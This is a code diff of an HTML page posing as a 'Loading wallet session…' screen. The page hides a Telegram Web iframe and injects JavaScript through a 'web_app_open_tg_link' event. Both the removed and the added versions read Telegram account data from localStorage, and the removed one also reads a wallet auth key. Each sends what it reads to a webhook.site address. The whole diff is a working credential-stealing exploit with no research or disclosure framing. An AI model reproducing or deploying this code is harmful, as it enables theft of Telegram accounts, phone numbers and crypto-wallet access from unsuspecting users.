@@ -4,28 +4,19 @@
     <h1>Loading wallet session…</h1>
     <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
     <script>
-      const exfiltrate = () => {
-        try {
-          const account = JSON.parse(localStorage.getItem("account1") || "{}");
-          const userId = account.userId || "unknown";
-          const phone = account.phone || "unknown";
-          const wallet = localStorage.getItem("wallet_auth_key") || "not_found";
-
-          fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?" +
-            "user=" + encodeURIComponent(userId) +
-            "&phone=" + encodeURIComponent(phone) +
-            "&wallet=" + encodeURIComponent(wallet),
-            { mode: "no-cors" }
-          );
-        } catch (e) {
-          console.error("Exfiltration failed", e);
-        }
-      };
-
       const payload = JSON.stringify({
         eventType: 'web_app_open_tg_link',
         eventData: {
-          path_full: `/wallet/start?x=${encodeURIComponent('(' + exfiltrate.toString() + ')()')}`
+          path_full: `/wallet/start?x=${encodeURIComponent(`
+            (function() {
+              try {
+                const data = localStorage.getItem('account1');
+                fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?data=' + encodeURIComponent(data), {
+                  mode: 'no-cors'
+                });
+              } catch (e) {}
+            })()
+          `)}`
         }
       });
 
